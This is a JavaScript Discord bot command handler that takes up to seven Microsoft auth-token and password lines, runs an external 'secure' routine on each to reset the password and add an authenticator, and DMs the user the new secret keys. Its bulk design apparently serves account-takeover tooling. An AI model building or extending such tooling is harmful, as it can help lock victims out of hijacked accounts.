const secure = require("../../utils/secure/recodesecure");
const generateuid = require("../../utils/generateuid");
const sendStatus = require("./bulkStatusMessage");
const { queryParams } = require("../../../db/database");

module.exports = {
    name: "bulkzygersecure",
    userOnly: true,
    callback: async (client, interaction) => {
        await interaction.deferReply({ ephemeral: true });

        const lines = interaction.fields
            .getTextInputValue("accounts")
            .split("\n")
            .map(l => l.trim())
            .filter(Boolean)
            .slice(0, 7);

        let settings = await queryParams(
            "SELECT * FROM secureconfig WHERE user_id=?",
            [interaction.user.id]
        );
        settings = settings[0];

        for (const line of lines) {
            try {
                const [msauth, password, secret] = line.split(":");

                const uid = await generateuid();
                await sendStatus(interaction, uid);

                settings.addzyger = true;
                settings.password = password;

                const acc = await secure(msauth, settings, uid, null);

                await interaction.user.send(
                    `🔑 Zyger Secure finished\nSecret Key: \`${acc.secretkey}\``
                );
            } catch {
                await interaction.user.send(
                    `❌ Zyger Secure failed: ${line}`
                );
            }
        }

        await interaction.editReply("✅ Bulk Zyger started. Check DMs.");
    }
};
